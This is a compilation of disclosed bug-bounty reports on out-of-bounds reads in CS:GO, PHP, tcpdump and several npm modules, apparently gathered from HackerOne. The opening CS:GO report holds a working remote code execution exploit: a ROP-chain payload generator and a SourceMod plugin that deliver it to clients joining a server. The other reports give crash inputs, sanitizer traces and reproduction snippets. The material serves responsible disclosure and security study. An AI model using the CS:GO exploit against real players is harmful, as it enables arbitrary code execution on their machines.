bool _MsgFunc_GlowPropTurnOff(CCSUserMsg_GlowPropTurnOff* msg)
{
  CBaseEntity* entity = nullptr;

  int ent_idx = msg->ent_index;
  if ( ent_idx >= 0 && entitylist[ent_idx] != nullptr )
  {
    CBaseHandle* handle = entitylist[ent_idx]
    entity = handle->GetBaseEntity();  // A virtual function
  }
  
  // ...
  
  return true;
}
```


# Exploiting the vulnerability
I will be discussing the `GlowPropTurnOff` message specifically for the remainder of this report, however this OOB read pattern exists in other messages too. I have successfully tested this on a couple of other CS:GO user messages, and while I haven't tested it I also suspect that this bug pattern exists in the network messages of other Source games as well.

This is the assembly used to access the `entitylist` array:
```asm
mov     eax, ent_idx
test    eax, eax
js      short loc_103B77A2
shl     eax, 4
mov     ecx, entitylist[eax]
```

The index is shifted left by 4 bits (`shl eax, 4`) before being used to access `entitylist`. This means that we can supply a large positive number that will overflow to a negative number, allowing us to return a pointer to pretty much anywhere in the module. Our goal will be to supply an index that returns a pointer to some memory that we control on the client. This memory will have the required vtable set up so that when `handle->GetBaseEntity()` is called it will call an address that we control.

Following a writeup of a similar bug (https://insomnihack.ch/wp-content/uploads/2017/04/AC_remote_exploitation_of_valve_source.pdf), I chose to use the [`ShowMenu`](https://github.com/SteamDatabase/Protobufs/blob/7c7bc10a1ed346a88cc6b9c13d6642578a9ecd50/csgo/cstrike15_usermessages.proto#L417-L421) message to set up the needed memory on the client. The `ShowMenu` message takes the `menu_string` supplied from the server, converts it to UTF16, and stores it in a global string variable `wchar_t g_szMenuString[512]`.

I wrote the following Python script to generate the payload needed to send through the `ShowMenu` message to set up a fake object with a valid vtable and also includes the ROP chain needed to pop calc:
```py
from pwn import *
import textwrap

BASE_ADDRESS        = 0x287E0000
FAKE_OBJ            = BASE_ADDRESS + 0x3174F3C

SHELL_EXECUTE_ADDR  = BASE_ADDRESS + 0xA8F244

GADGET_XCHG_EAX_ESP = BASE_ADDRESS + 0xA2AAD1
GADGET_POP_ESP      = BASE_ADDRESS + 0x7E031C
GADGET_POP_EAX      = BASE_ADDRESS + 0x4a925
GADGET_POP_EDI      = BASE_ADDRESS + 0x2f00C6
GADGET_MOV_EAX_EDI  = BASE_ADDRESS + 0x74215
GADGET_MOV_EAX_EAX  = BASE_ADDRESS + 0x73c92
GADGET_XOR_EAX_EAX  = BASE_ADDRESS + 0xb4279
GADGET_XCHG_EAX_EDI = BASE_ADDRESS + 0x1da80f

def to_unicode(dword):
    a = dword & 0xffff;
    b = dword >> 16;
    return eval('u"\\u%s\\u%s"' % (hex(a)[2:].zfill(4), hex(b)[2:].zfill(4)))

def write(addr, value):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(value)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_deref(addr, to_deref):
    rop = u''
    rop += to_unicode(GADGET_POP_EAX)
    rop += to_unicode(to_deref)
    rop += to_unicode(GADGET_MOV_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def write_zero(addr):
    rop = u''
    rop += to_unicode(GADGET_XOR_EAX_EAX)
    rop += to_unicode(GADGET_POP_EDI)
    rop += to_unicode(addr)
    rop += to_unicode(GADGET_XCHG_EAX_EDI)
    rop += to_unicode(GADGET_MOV_EAX_EDI)
    return rop

def stack_pivot(addr):
    rop = u''
    rop += to_unicode(GADGET_POP_ESP)
    rop += to_unicode(addr)
    return rop

rop = ''

open_str_addr = FAKE_OBJ + 400
rop += write(open_str_addr, u32('open'))

calc_str_addr = FAKE_OBJ + 420
rop += write(calc_str_addr, u32('calc'))

# Move stack somewhere where it can safely not overwrite our fake object as functions are called
params_addr = FAKE_OBJ + 1000000
rop += write_deref(params_addr, SHELL_EXECUTE_ADDR)
rop += write(params_addr + 4, 0x41414141)
rop += write_zero(params_addr + 8)
rop += write(params_addr + 12, open_str_addr)
rop += write(params_addr + 16, calc_str_addr)
rop += write_zero(params_addr + 20)
rop += write_zero(params_addr + 24)
rop += write_zero(params_addr + 28)
rop += stack_pivot(params_addr)

# Fake object structure
#  0 - pointer to actual object (#1)
#  1 - pointer to vtable        (#2)
#  2 - pointer to `pop esp`           <-- start of vtable, and where eax will be pointing once #9 is called
#  3 - pointer to full stack    (#10) <-- This will move the stack to somewhere where we have more room 
#  4 - junk
#  5 - junk
#  6 - junk
#  7 - junk
#  8 - junk
#  9 - ptr to `xchg eax, esp`         <-- address that is initially jumped to, will set esp to #2 so we can pivot stack & begin ROP chain
# 10 - stack                          <-- where our ROP chain begins
fakeobj = u''
fakeobj += '--'
fakeobj += to_unicode(FAKE_OBJ + 4)
fakeobj += to_unicode(FAKE_OBJ + 4 * 2)
fakeobj += to_unicode(GADGET_POP_ESP)
fakeobj += to_unicode(FAKE_OBJ + 4 * 10)
fakeobj += u'\u4141\u4141'
fakeobj += u'\u4242\u4242'
fakeobj += u'\u4343\u4343'
fakeobj += u'\u4444\u4444'
fakeobj += u'\u4545\u4545'
fakeobj += to_unicode(GADGET_XCHG_EAX_ESP)
fakeobj += rop

fakeobj = fakeobj.encode('utf-8')

print(''.join(['\\x%02x' % ord(c) for c in fakeobj]))
```

*Note*: As in #470520 the script above needs to know the base address of the client's `client_panorama.dll` module in order to be 100% reliable, however it isn't possible to this due to ASLR.

Next, this payload needs to be sent to the client. I did this using the following SourceMod plugin:
```cpp
#include <sdktools>

public void OnPluginStart()
{
	HookEvent( "player_spawn", Event_PlayerSpawn );
}

public Action Event_PlayerSpawn( Event event, const char[] name, bool dontBroadcast )
{
    int client = GetClientOfUserId( event.GetInt( "userid" ) );
	
	{
		char payload[] = "PLACE PAYLOAD HERE";
	
		Protobuf msg = UserMessageToProtobuf( StartMessageOne( "ShowMenu", client ) );
		msg.SetInt( "bits_valid_slots", 0xFFFFFFFF );
		msg.SetInt( "display_time", 0 );
		msg.SetString( "menu_string", payload );
		EndMessage();
	}
	
	{
		Protobuf msg = UserMessageToProtobuf( StartMessageOne( "GlowPropTurnOff", client ) );
		msg.SetInt( "entidx", 0xfe43167 );
		EndMessage();
	}

	return Plugin_Continue;
}
```

Once a client connects the payload is set up using the `ShowMenu` message and then is triggered immediately after with the `GlowPropTurnOff` message, resulting in calc being popped.


# PoC
Here is a video showcasing the bug being triggered on CS:GO when joining a server:
{F732616}


# Reproduction steps
1) Start CS:GO and note the base address of `client_panorama.dll`
2) Replace the value of `BASE_ADDRESS` in the Python script above with this base address value and run the script
3) Copy the generated payload into the contents of the `payload` string in the SourceMod script above and compile the plugin
4) Add the compiled plugin to the server and connect to this server with the client, as soon as the client is fully connected calc will be popped automatically

## Impact

This bug allows an attacker to execute arbitrary code on the computers of any clients that join their server.

---

### [Out of Bounds Memory Read in exif_scan_thumbnail](https://hackerone.com/reports/675578)

- **Report ID:** `675578`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** Internet Bug Bounty
- **Reporter:** @sediruoksitsero
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:49:45.909Z
- **CVE(s):** CVE-2019-11041

**Vulnerability Information:**

I have found and reported an out of bounds memory read in PHP [exif_scan_thumbnail]
When PHP EXIF extension is parsing EXIF information from an image, e.g. via exif_read_data() function, in PHP versions 7.1.x below 7.1.31, 7.2.x below 7.2.21 and 7.3.x below 7.3.8 it is possible to supply it with data what will cause it to read past the allocated buffer.
This has been fixed and assigned CVE-2019-11041
The bug report is here: https://bugs.php.net/bug.php?id=78222
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11041
https://nvd.nist.gov/vuln/detail/CVE-2019-11041

## Impact

This may lead to information disclosure or crash.

---

### [Out of Bounds Memory Read in exif_process_user_comment](https://hackerone.com/reports/675580)

- **Report ID:** `675580`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** Internet Bug Bounty
- **Reporter:** @sediruoksitsero
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:49:40.092Z
- **CVE(s):** CVE-2019-11042

**Vulnerability Information:**

I have found and reported an out of bounds memory read in PHP [exif_process_user_comment]
When PHP EXIF extension is parsing EXIF information from an image, e.g. via exif_read_data() function, in PHP versions 7.1.x below 7.1.31, 7.2.x below 7.2.21 and 7.3.x below 7.3.8 it is possible to supply it with data what will cause it to read past the allocated buffer.
This has been fixed and assigned CVE-2019-11042
The bug report is here: https://bugs.php.net/bug.php?id=78256
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11042
https://nvd.nist.gov/vuln/detail/CVE-2019-11042

## Impact

This may lead to information disclosure or crash.

---

### [null pointer dereference in imap_mail](https://hackerone.com/reports/456727)

- **Report ID:** `456727`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** Internet Bug Bounty
- **Reporter:** @shuoz
- **Bounty:** - usd
- **Disclosed:** 2020-11-09T01:45:05.229Z
- **CVE(s):** CVE-2018-19935

**Vulnerability Information:**

in imap_mail if message args is null, in _php_imap_mail no check wheater message  can get, so crash.

```
     fprintf(sendmail, "\n%s\n", message);

```



/usr/local/php/bin/php ./craxxx.php 

Warning: imap_mail(): No message string in mail command in /home/fan/github/php-7.2.10/myselffuzz/craxxx.php on line 3
sh: 1: -t: not found
Segmentation fault (core dumped)







../sapi/cli/php ./craxxx.php 

Warning: imap_mail(): No message string in mail command in /home/fan/github/php-7.2.10/myselffuzz/craxxx.php on line 3
ASAN:SIGSEGV
=================================================================
==23766==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x7fae925d9cc0 bp 0x7ffcb6b27a10 sp 0x7ffcb6b274a0 T0)
sh: 1: -t: not found
    #0 0x7fae925d9cbf in vfprintf (/lib/x86_64-linux-gnu/libc.so.6+0x4ecbf)
    #1 0x7fae926a1bc8 in __fprintf_chk (/lib/x86_64-linux-gnu/libc.so.6+0x116bc8)
    #2 0xa5aeb0 in fprintf /usr/include/x86_64-linux-gnu/bits/stdio2.h:97
    #3 0xa5aeb0 in _php_imap_mail /home/fan/github/php-7.2.10/ext/imap/php_imap.c:4065
    #4 0xa5b22d in zif_imap_mail /home/fan/github/php-7.2.10/ext/imap/php_imap.c:4112
    #5 0x17da703 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/fan/Desktop/php-7.2.10/Zend/zend_vm_execute.h:573
    #6 0x17da703 in execute_ex /home/fan/Desktop/php-7.2.10/Zend/zend_vm_execute.h:59747
    #7 0x181b5c3 in zend_execute /home/fan/Desktop/php-7.2.10/Zend/zend_vm_execute.h:63776
    #8 0x1356ef2 in zend_execute_scripts /home/fan/Desktop/php-7.2.10/Zend/zend.c:1496
    #9 0x11c0776 in php_execute_script /home/fan/Desktop/php-7.2.10/main/main.c:2590
    #10 0x1823488 in do_cli /home/fan/Desktop/php-7.2.10/sapi/cli/php_cli.c:1011
    #11 0x18256f4 in main /home/fan/Desktop/php-7.2.10/sapi/cli/php_cli.c:1404
    #12 0x7fae925ab82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #13 0x440888 in _start (/home/fan/github/php-7.2.10/sapi/cli/php+0x440888)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV ??:0 vfprintf
==23766==ABORTING




Test script:
---------------
<?php
	imap_mail('1', 1, NULL);

?>

php bugs:
https://bugs.php.net/bug.php?id=77020

## Impact

IMAP

---

### [Tcpdump before 4.9.3 has a buffer over-read in print-dccp.c:dccp_print_option() (CVE-2018-16229)](https://hackerone.com/reports/724253)

- **Report ID:** `724253`
- **Severity:** Critical
- **Weakness:** Out-of-bounds Read
- **Program:** Internet Bug Bounty
- **Reporter:** @bugbasher
- **Bounty:** 500 usd
- **Disclosed:** 2020-02-13T21:28:05.549Z
- **CVE(s):** CVE-2018-16229

**Vulnerability Information:**

Tcpdump before 4.9.3 has a buffer over-read in print-dccp.c:dccp_print_option(). This vulnerability was disclosed to the tpcdump maintainers and was fixed in version 4.9.3 and disclosed as CVE-2018-16229.

I was credited with finding and disclosing this vulnerability: https://www.tcpdump.org/public-cve-list.txt

```
CVE-2018-16229,tcpdump,dccp_options-oobr.pcap,"Ryan Ackroyd",2018/05/26,Y,211124b972e74f0da66bc8b16f181f78793e2f66,4.9.3,,
```

This vulnerability was discovered in version 4.9.2 after compiling tcpdump with Address Sanitizer (ASAN) and fuzzing tcpdump with mutated packets. This vulnerability can be remotely exploited over the network by an attacker with no interaction needed from the victim.

I have attached test-case "fuzzer06:id:000018,sig:11,src:007353,op:havoc,rep:16" as a Proof of Concept to this report.

This vulnerability can be triggered using the following command:

```
tcpdump -e -vvvv -H -u -nn -r fuzzer06:id:000018,sig:11,src:007353,op:havoc,rep:16
```
  
The above command shows the following output from ASAN which notes this vulnerability as being a "heap-buffer-overflow":

```
reading from file fuzzer06:id:000018,sig:11,src:007353,op:havoc,rep:16, link-type EN10MB (Ethernet)
17:59:25.816632 00:07:e9:bd:5d:1f > 00:14:22:59:55:51, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 65312, offset 0, flags [DF], proto DCCP (33), length 52)
    139.133.209.176.39420 > 139.133.209.65.5001: DCCP (CCVal 0, CsCov 0, cksum 0xaaf3 (incorrect -> 0x8bf3)) DCCP-Request (service=-189888898) seq 8 <nop, nop, nop, nop, change_l ack_ratio 2, change_r ccid 2, change_l ccid 2>
15:27:00.817006 00:14:22:59:55:51 > 00:07:e9:bd:5d:1f, ethertype IPv4 (0x0800), length 82: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto DCCP (33), length 68)
    139.133.209.65.5001 > 139.133.209.176.39420: DCCP (CCVal 0, CsCov 0, ) DCCP-Response (service=0) (ack=38464816766) seq 1960341146 <nop, nop, change_l ack_ratio 2, [|dccp]>
15:27:00.817125 00:07:e9:bd:00:1f > 00:14:22:59:55:51, ethertype IPv4 (0x0800), length 32582: (tos 0x0, ttl 64, id 65313, offset 0, flags [DF], proto DCCP (33), length 56)
=================================================================
==5790==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf4a01bf4 at pc 0x080fd4b6 bp 0xfff8c088 sp 0xfff8c078
READ of size 4 at 0xf4a01bf4 thread T0
    #0 0x80fd4b5 in EXTRACT_32BITS extract.h:190
    #1 0x80fd4b5 in dccp_print_option print-dccp.c:633
    #2 0x80fd4b5 in dccp_print print-dccp.c:496
    #3 0x816e21a in ip_print_demux print-ip.c:391
    #4 0x816e21a in ip_print print-ip.c:673
    #5 0x8124f70 in ethertype_print print-ether.c:333
    #6 0x8126065 in ether_print print-ether.c:236
    #7 0x80844b4 in pretty_print_packet print.c:332
    #8 0x8065ce8 in print_packet tcpdump.c:2497
    #9 0x83fcb6a in pcap_offline_read savefile.c:527
    #10 0x8346bfe in pcap_loop pcap.c:890
    #11 0x805afb8 in main tcpdump.c:2000
    #12 0xf6fda636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #13 0x806226a  (/home/user/targets/builds33/tcpdump-4.9.2/tcpdump+0x806226a)

0xf4a01bf6 is located 0 bytes to the right of 70-byte region [0xf4a01bb0,0xf4a01bf6)
allocated by thread T0 here:
    #0 0xf720edee in malloc (/usr/lib32/libasan.so.2+0x96dee)
    #1 0x8400752 in pcap_check_header sf-pcap.c:401

SUMMARY: AddressSanitizer: heap-buffer-overflow extract.h:190 EXTRACT_32BITS
Shadow bytes around the buggy address:
  0x3e940320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x3e940370: fa fa fa fa fa fa 00 00 00 00 00 00 00 00[06]fa
  0x3e940380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940390: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e9403a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e9403b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e9403c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==5790==ABORTING
```

More information about this vulnerability can be found in the following locations:

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-16229
CVE: https://www.cvedetails.com/cve/CVE-2018-16229/
MITRE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16229

## Impact

This vulnerability leads to significant information disclosure and allows an attacker to remotely modify system files. An attacker is easily able to exploit this vulnerability remotely across a network without interaction from the victim.   

 CVSS v3.1 Severity and Metrics:

Base Score: 9.8 CRITICAL
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (V3.1 legend)
Impact Score: 5.9
Exploitability Score: 3.9

Attack Vector (AV): Network
Attack Complexity (AC): Low
Privileges Required (PR): None
User Interaction (UI): None
Scope (S): Unchanged
Confidentiality (C): High
Integrity (I): High
Availability (A): High

---

### [Tcpdump before 4.9.3 has a buffer over-read in print-802_11.c (CVE-2018-16227)](https://hackerone.com/reports/724243)

- **Report ID:** `724243`
- **Severity:** Critical
- **Weakness:** Out-of-bounds Read
- **Program:** Internet Bug Bounty
- **Reporter:** @bugbasher
- **Bounty:** 500 usd
- **Disclosed:** 2020-02-13T21:27:26.229Z
- **CVE(s):** CVE-2018-16227

**Vulnerability Information:**

Versions of tcpdump before 4.9.3 are vulnerable to a buffer over-read in print-802_11.c. This vulnerability was disclosed to the tcpdump maintainers and was recently patched in version 4.9.3 and disclosed as (CVE-2018-16227).

I was credited with finding and disclosing this vulnerability: https://www.tcpdump.org/public-cve-list.txt
```
CVE-2018-16227,tcpdump,ieee802.11_meshhdr-oobr.pcap,"Ryan Ackroyd",2018/05/26,Y,4846b3c5d0a850e860baf4f07340495d29837d09,4.9.3,,
```
This vulnerability was found and tested on tcpdump 4.9.2 after compiling tcpdump with Address Sanitizer (ASAN) support and fuzzing tcpdump with mutated packets, I have attached a working test-case as a Proof of Concept to this report named "fuzzer06:id:000021,sig:11,src:008627,op:havoc,rep:2". 

This vulnerability can be triggered using the following command: 

```
tcpdump -e -vvvv -H -u -nn -r fuzzer06:id:000021,sig:11,src:008627,op:havoc,rep:2
```

The above command produces the following output, ASAN marks this as a "heap-buffer-overflow ":

```
reading from file fuzzer06:id:000021,sig:11,src:008627,op:havoc,rep:2, link-type IEEE802_11_RADIO (802.11 plus radiotap header)
12:05:07.276297 15738588889088us tsft 4096 MHz 11n 19dBm signal antenna 20 52.0 Mb/s MCS 25 20 MHz long GI LDPC FEC More Data 44us BSSID:20:7c:8f:50:3f:3a DA:68:a3:c4:03:46:da SA:20:7c:8f:50:3f:3a ReAssoc Request[|802.11]
=================================================================
==5793==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf4a01801 at pc 0x08090ae9 bp 0xffc10aa8 sp 0xffc10a98
READ of size 1 at 0xf4a01801 thread T0
    #0 0x8090ae8 in ctrl_body_print print-802_11.c:1676
    #1 0x8090ae8 in ieee802_11_print print-802_11.c:2092
    #2 0x809297b in ieee802_11_radio_print print-802_11.c:3257
    #3 0x809297b in ieee802_11_radio_if_print print-802_11.c:3352
    #4 0x80844b4 in pretty_print_packet print.c:332
    #5 0x8065ce8 in print_packet tcpdump.c:2497
    #6 0x83fcb6a in pcap_offline_read savefile.c:527
    #7 0x8346bfe in pcap_loop pcap.c:890
    #8 0x805afb8 in main tcpdump.c:2000
    #9 0xf700a636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)
    #10 0x806226a  (/home/user/targets/builds33/tcpdump-4.9.2/tcpdump+0x806226a)

0xf4a01801 is located 1 bytes to the right of 64-byte region [0xf4a017c0,0xf4a01800)
allocated by thread T0 here:
    #0 0xf723edee in malloc (/usr/lib32/libasan.so.2+0x96dee)
    #1 0x8400752 in pcap_check_header sf-pcap.c:401

SUMMARY: AddressSanitizer: heap-buffer-overflow print-802_11.c:1676 ctrl_body_print
Shadow bytes around the buggy address:
  0x3e9402b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e9402c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e9402d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e9402e0: fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd
  0x3e9402f0: fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00
=>0x3e940300:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940310: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x3e940350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==5793==ABORTING
```

More information about this vulnerability can be found in the following locations: 

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-16227
CVE details: https://www.cvedetails.com/cve/CVE-2018-16227/

## Impact

This vulnerability can lead to significant information disclosure and allow an attacker to modify system files remotely, across a network with no interaction from the victim.

CVSS v3.1 Severity and Metrics:

Base Score: 9.8 CRITICAL
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (V3.1 legend)
Impact Score: 5.9
Exploitability Score: 3.9

Attack Vector (AV): Network
Attack Complexity (AC): Low
Privileges Required (PR): None
User Interaction (UI): None
Scope (S): Unchanged
Confidentiality (C): High
Integrity (I): High
Availability (A): High

---

### [`base64-url` below 2.0 allocates uninitialized Buffers when number is passed in input](https://hackerone.com/reports/321692)

- **Report ID:** `321692`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-05-12T09:10:34.245Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report an uninitialized Buffer allocation issue in `base64-url`.
It allows to extract sensitive data from uninitialized memory or to cause a DoS by passing in a large number, in setups where typed user input can be passed (e.g. from JSON).

# Module

**module name:** `base64-url`
**version:** 1.3.3
**npm page:** `https://www.npmjs.com/package/base64-url`

## Module Description

> Base64 encode, decode, escape and unescape for URL applications.

## Module Stats

48 047 downloads in the last day
311 047 downloads in the last week
1 374 420 downloads in the last month

# Vulnerability

## Vulnerability Description

The problem arises when a number is passed in, e.g. from user-submitted JSON-encoded data.
The API should not propagate the already-bad Buffer issue further.

On Node.js 6.x and below, this exposes uninitialized memory, which could contain sensitive data.

This can be also used to cause a DoS on any Node.js version by consuming the memory when large numbers are passed on input.

## Steps To Reproduce:

`console.log(require('base64-url').encode(1000))` (Node.js 6.x and lower — note uninitialized memory in output)

`require('base64-url').encode(1e8)` (any Node.js verision — note memory usage and time)

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 6.13.0
- Node.js 9.5.0

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

I contacted the author on 2017-03-02.
I did not receive a reply, but on 2017-08-17 a semver-major version 2.0.0 was released with a fix.

I want a CVE assigned to this issue, also I would prefer the fix to be backported to 1.x branch — a lot of modules still depend 1.x as of 2018-02-26.

Top-10 apps `@latest` versions of which install affected `base64-url@1` through their deps chains:
```
664945  react-native
346288  metro-bundler
83764   hubot
81089   sails
51724   phonegap
45522   csrf-tokens
28326   hubot-mock-adapter
25778   mock-hubot
23712   connect-phonegap
18808   nodedata
```

In total, there are about 2460 such apps in the npm registry, to my knowledge.

## Impact

Sensitive uninitialized memory exposure on Node.js 6.x or lower
Denail of Service on any Node.js version

---

### [`npmconf` (and `npm` js api) allocate and write to disk uninitialized memory content when a typed number is passed as input on Node.js 4.x](https://hackerone.com/reports/320269)

- **Report ID:** `320269`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-05-12T08:56:12.533Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a Buffer allocation issue in `npmconf` (and `npm` package js api).
It allows to extract sensitive content from uninitialized memory by passing typed input to `setCredentialsByURI`, limited to Node.js 4.x and below.

# Module

**module name:** `npmconf`
**version:** 2.1.2
**npm page:** `https://www.npmjs.com/package/npmconf`

**module name:** `npm`
**version:** 5.6.0
**npm page:** `https://www.npmjs.com/package/npm`

## Module Description

> The config thing npm uses

## Module Stats

### npmconf

40 292 downloads in the last day
219 837 downloads in the last week
897 947 downloads in the last month

~1 0775 364 estimated downloads per year

`npmconf` is deprecated, but doesn't mention security issues and is still widely used, and the usage seems to *increase* over time.

### npm

`npm` download stats are not representive here, as it's mainly used as a CLI, not as JS api, but here they are (e.g. for comparison with `npmconf`):

141 545 downloads in the last day
1 067 194 downloads in the last week
3 701 192 downloads in the last month

~44 414 304 estimated downloads per year

# Vulnerability

## Vulnerability Description

When a number is passed to the `password` property of `config.setCredentialsByURI`, `npmconf`/`npm` allocate uninitialized Buffer instances during conversion to base64 (on Node.js 4.x) due to missing type checks before passing user input to the `new Buffer()` constructor.

Those Buffer instances could (and most likely will) contain sensitive information, see [Buffer-knows-everything.md](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md).

Node.js 4.x is stated as supported in `npm`.

## Steps To Reproduce:

Use Node.js 4.x LTS or below.

### npmconf
```js
var URI = "https://registry.example.com:8661/";
require('npmconf').load({}, function (err, conf) {
  conf.setCredentialsByURI(URI, {username: 'foo', email: 'boo@example.com', password: 200});
  console.log(conf.getCredentialsByURI(URI)); // This just outputs the setting
  // conf.save('user', function() {}) // Warning: writes base64-encoded uninitialized buffer .npmrc
});
```

### npm
```js
var URI = "https://registry.example.com:8661/";
require('npm').load({}, function (err, npm) {
  npm.config.setCredentialsByURI(URI, {username: 'foo', email: 'boo@example.com', password: 200});
  console.log(npm.config.getCredentialsByURI(URI)); // This just outputs the setting
  // npm.config.save('user', function() {}) // Warning: writes base64-encoded uninitialized buffer .npmrc
});
```

## Supporting Material/References:

- Arch Linux
- Node.js v4.8.7 (latest in 4.x LTS branch)
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: Y
- I opened an issue in the related repository: N

I reported this initially on 2016-01-20 over email, but didn't receive any response.
Probably was deemed insignificant or out-of-scope, but I still think this should be fixed and disclosed.

## Impact

Read uninitialized memory, extracting sensitive information from it.
Cause a DoS by large Buffer allocation and conversion to string.

---

### [`base64url` allocates uninitialized Buffers when number is passed in input on Node.js 4.x and below](https://hackerone.com/reports/321687)

- **Report ID:** `321687`
- **Severity:** High
- **Weakness:** Out-of-bounds Read
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-05-11T20:18:15.861Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report an uninitialized Buffer allocation issue in `base64url`.
It allows to extract sensitive data from uninitialized memory or to cause a DoS by passing in a large number, in setups where typed user input can be passed (e.g. from JSON), on Node.js 4.x and lower.

# Module

**module name:** `base64url`
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/base64url`

## Module Description

> Converting to, and from, base64url

## Module Stats

182 924 downloads in the last day
1 097 142 downloads in the last week
4 601 176 downloads in the last month

# Vulnerability

## Vulnerability Description

The problem arises when a number is passed in, e.g. from user-submitted JSON-encoded data.
The API should not propagate the already-bad Buffer issue further.

On Node.js 4.x and below (4.x is still supported), this exposes uninitialized memory, which could contain sensitive data. This can be also used to cause a DoS by consuming the memory when large numbers are passed on input.

## Steps To Reproduce:

`console.log(require('base64url').encode(1000))`  (note uninitialized memory in output)
`require('base64url').encode(1e8)` (note memory usage and time)

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Arch Linux Current
- Node.js 4.8.7

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository:  N

I tried to contact the maintainer over email, first time on 2017-03-02, last time on 2018-02-18, but did not receive a reply.

## Impact

Sensitive uninitialized memory exposure
Denail of Service
This issue affects only setups using Node.js 4.x (still supported) or lower.

---
